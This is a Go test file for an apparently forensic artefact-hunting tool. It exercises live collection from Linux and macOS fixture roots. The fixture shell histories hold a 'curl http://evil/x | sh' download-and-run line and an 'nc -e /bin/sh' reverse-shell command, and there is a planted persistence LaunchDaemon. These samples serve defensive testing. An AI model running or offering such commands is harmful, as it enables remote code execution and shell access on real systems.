//go:build unix

package main

// live_test proves the binary runs ON the live host: livecollect stages the
// artefact surface out of a fixture root (GODAEMONHUNTER_LIVE_ROOT), the layered
// run treats it as the host — building the knowledge store and emitting records
// enriched by it, each stamped with live provenance — and leaves no scratch
// behind. A fixture root plus GODAEMONHUNTER_LIVE_OS lets the macOS profile be
// exercised here too. LIVE and IMAGE are mutually exclusive, and an OS with no
// profile is a config error.

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

// writeLiveLinux builds a minimal live Linux root: Layer-1 identity, a
// localtime symlink (zone via its target), and Layer-2 artefacts for syslog and
// shell.
func writeLiveLinux(t *testing.T, root string) {
	t.Helper()
	w := func(rel, content string) {
		p := filepath.Join(root, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(content), 0o644)
	}
	w("etc/os-release", "PRETTY_NAME=\"Debian GNU/Linux 13\"\nID=debian\n")
	w("etc/hostname", "web01\n")
	w("etc/passwd", "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/zsh\n")
	w("var/log/auth.log", "Jan 10 22:14:02 web01 sshd[100]: Accepted password for alice from 10.0.0.5 port 4000 ssh2\n")
	w("home/alice/.bash_history", "id\nwhoami\ncurl http://evil/x | sh\n")
	w("usr/share/zoneinfo/Europe/Berlin", "TZif-binary")
	os.Symlink("../usr/share/zoneinfo/Europe/Berlin", filepath.Join(root, "etc/localtime"))
}

// writeLiveDarwin builds a minimal live macOS root: the version plist, a
// LaunchDaemon, a dslocal account, the system log and a user history.
func writeLiveDarwin(t *testing.T, root string) {
	t.Helper()
	w := func(rel, content string) {
		p := filepath.Join(root, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(content), 0o644)
	}
	w("System/Library/CoreServices/SystemVersion.plist", `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>ProductName</key><string>macOS</string>
<key>ProductVersion</key><string>14.4.1</string>
<key>ProductBuildVersion</key><string>23E224</string>
</dict></plist>`)
	w("Library/LaunchDaemons/com.evil.daemon.plist", `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>Label</key><string>com.evil.daemon</string>
<key>ProgramArguments</key><array><string>/tmp/evil</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`)
	w("private/var/db/dslocal/nodes/Default/users/alice.plist", `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>name</key><array><string>alice</string></array>
<key>uid</key><array><string>501</string></array>
<key>gid</key><array><string>20</string></array>
<key>home</key><array><string>/Users/alice</string></array>
<key>shell</key><array><string>/bin/zsh</string></array>
</dict></plist>`)
	w("private/var/log/system.log", "Apr 10 09:15:22 mbp sshd[501]: Accepted keyboard-interactive/pam for alice from 10.0.0.9 port 51000 ssh2\n")
	w("Users/alice/.zsh_history", "sudo -s\nnc -e /bin/sh 10.0.0.9 4444\n")
}

func TestHuntRunsLive(t *testing.T) {
	root, out, work := t.TempDir(), t.TempDir(), t.TempDir()
	writeLiveLinux(t, root)

	var buf bytes.Buffer
	code := run(nil, env(map[string]string{
		"GODAEMONHUNTER_LIVE": "1", "GODAEMONHUNTER_LIVE_ROOT": root, "GODAEMONHUNTER_LIVE_OS": "linux",
		"GODAEMONHUNTER_OUT_DIR": out, "GODAEMONHUNTER_WORK_DIR": work,
	}), &buf)
	if code != 0 {
		t.Fatalf("live hunt exit %d: %s", code, buf.String())
	}
	var sum huntSummary
	if err := json.Unmarshal(bytes.TrimSpace(buf.Bytes()), &sum); err != nil {
		t.Fatal(err)
	}
	if sum.Live == "" {
		t.Fatalf("summary does not name the live host: %+v", sum)
	}

	// Layer 1 built the per-host knowledge store, and Layer 2 came out enriched
	// and stamped with live provenance: the syslog line got the host's Berlin
	// zone (22:14 local == 21:14Z) and the Host block, and its Origin is the
	// live volume at the real on-host path.
	if _, err := os.Stat(filepath.Join(out, "knowledge", sum.Live)); err != nil {
		t.Fatalf("knowledge/<live>/ missing: %v", err)
	}
	rec := readFlat(t, filepath.Join(out, "gosyslog"))
	if rec["EventTime"] != "2026-01-10T21:14:02.000000Z" {
		t.Errorf("host zone not applied: %v", rec["EventTime"])
	}
	host, _ := rec["Host"].(map[string]any)
	if host == nil || host["Hostname"] != "web01" {
		t.Errorf("Host block not stamped from the live knowledge store: %v", rec["Host"])
	}
	origin, _ := rec["Origin"].(map[string]any)
	if origin == nil || origin["Volume"] != "live" || origin["Path"] != "/var/log/auth.log" {
		t.Errorf("live provenance missing: %v", rec["Origin"])
	}
	if _, ok := rec["Snapshot"]; ok {
		t.Errorf("a live record must carry no Snapshot: %v", rec["Snapshot"])
	}

	// nothing is exported: the stage is cleaned up.
	if entries, _ := os.ReadDir(work); len(entries) != 0 {
		t.Fatalf("scratch left behind: %v", entries)
	}
}

func TestHuntRunsLiveDarwin(t *testing.T) {
	root, out, work := t.TempDir(), t.TempDir(), t.TempDir()
	writeLiveDarwin(t, root)

	var buf bytes.Buffer
	code := run(nil, env(map[string]string{
		"GODAEMONHUNTER_LIVE": "yes", "GODAEMONHUNTER_LIVE_ROOT": root, "GODAEMONHUNTER_LIVE_OS": "darwin",
		"GODAEMONHUNTER_OUT_DIR": out, "GODAEMONHUNTER_WORK_DIR": work,
	}), &buf)
	if code != 0 {
		t.Fatalf("darwin live hunt exit %d: %s", code, buf.String())
	}
	var sum huntSummary
	json.Unmarshal(bytes.TrimSpace(buf.Bytes()), &sum)

	// the macOS Layer-1 parser built the store from the plist, and a macOS-only
	// Layer-2 parser (golaunchd) ran beside the Linux ones.
	host := readOne(t, filepath.Join(out, "knowledge", sum.Live), "gomachost.jsonl")
	if host["RecordType"] != "os_release" || host["Name"] != "macOS" {
		t.Errorf("gomachost did not read SystemVersion.plist: %v", host)
	}
	job := readFlat(t, filepath.Join(out, "golaunchd"))
	if job["Label"] != "com.evil.daemon" {
		t.Errorf("golaunchd did not read the LaunchDaemon: %v", job)
	}
	if entries, _ := os.ReadDir(work); len(entries) != 0 {
		t.Fatalf("scratch left behind: %v", entries)
	}
}

func TestSubtoolRunsLive(t *testing.T) {
	root, out, work := t.TempDir(), t.TempDir(), t.TempDir()
	writeLiveLinux(t, root)

	var buf bytes.Buffer
	code := run([]string{"gosyslog"}, env(map[string]string{
		"GOSYSLOG_LIVE": "1", "GOSYSLOG_LIVE_ROOT": root, "GOSYSLOG_LIVE_OS": "linux",
		"GOSYSLOG_OUT_DIR": out, "GOSYSLOG_WORK_DIR": work,
	}), &buf)
	if code != 0 {
		t.Fatalf("live sub-tool exit %d: %s", code, buf.String())
	}
	// flat: a single-subtool live run writes <out>/<asset-id>.jsonl (the live host name)
	matches, _ := filepath.Glob(filepath.Join(out, "*.jsonl"))
	if len(matches) != 1 {
		t.Fatalf("want one flat record file under <out>/, got %v: %s", matches, buf.String())
	}
	if entries, _ := os.ReadDir(work); len(entries) != 0 {
		t.Fatalf("scratch left behind: %v", entries)
	}
}

func TestLiveAndImageConflict(t *testing.T) {
	root := t.TempDir()
	writeLiveLinux(t, root)
	var buf bytes.Buffer
	code := run(nil, env(map[string]string{
		"GODAEMONHUNTER_LIVE": "1", "GODAEMONHUNTER_IMAGE": "disk.vmdk", "GODAEMONHUNTER_LIVE_ROOT": root,
		"GODAEMONHUNTER_OUT_DIR": t.TempDir(), "GODAEMONHUNTER_WORK_DIR": t.TempDir(),
	}), &buf)
	if code != 2 {
		t.Fatalf("LIVE+IMAGE exit %d, want config error 2: %s", code, buf.String())
	}

	// the sub-tool path rejects the same combination.
	buf.Reset()
	code = run([]string{"gosyslog"}, env(map[string]string{
		"GOSYSLOG_LIVE": "1", "GOSYSLOG_IMAGE": "disk.vmdk", "GOSYSLOG_LIVE_ROOT": root,
		"GOSYSLOG_OUT_DIR": t.TempDir(), "GOSYSLOG_WORK_DIR": t.TempDir(),
	}), &buf)
	if code != 2 {
		t.Fatalf("sub-tool LIVE+IMAGE exit %d, want 2: %s", code, buf.String())
	}
}

func TestLiveUnsupportedOS(t *testing.T) {
	root := t.TempDir()
	writeLiveLinux(t, root)
	var buf bytes.Buffer
	code := run(nil, env(map[string]string{
		"GODAEMONHUNTER_LIVE": "1", "GODAEMONHUNTER_LIVE_OS": "windows", "GODAEMONHUNTER_LIVE_ROOT": root,
		"GODAEMONHUNTER_OUT_DIR": t.TempDir(), "GODAEMONHUNTER_WORK_DIR": t.TempDir(),
	}), &buf)
	if code != 2 {
		t.Fatalf("unsupported LIVE_OS exit %d, want 2: %s", code, buf.String())
	}
	var sum huntSummary
	json.Unmarshal(bytes.TrimSpace(buf.Bytes()), &sum)
	if sum.Status != "config_error" {
		t.Fatalf("status = %q, want config_error", sum.Status)
	}
}

func TestLiveBadBool(t *testing.T) {
	var buf bytes.Buffer
	code := run(nil, env(map[string]string{
		"GODAEMONHUNTER_LIVE": "maybe", "GODAEMONHUNTER_OUT_DIR": t.TempDir(), "GODAEMONHUNTER_WORK_DIR": t.TempDir(),
		"GODAEMONHUNTER_INPUT_DIR": t.TempDir(),
	}), &buf)
	if code != 2 {
		t.Fatalf("bad LIVE bool exit %d, want 2: %s", code, buf.String())
	}
}
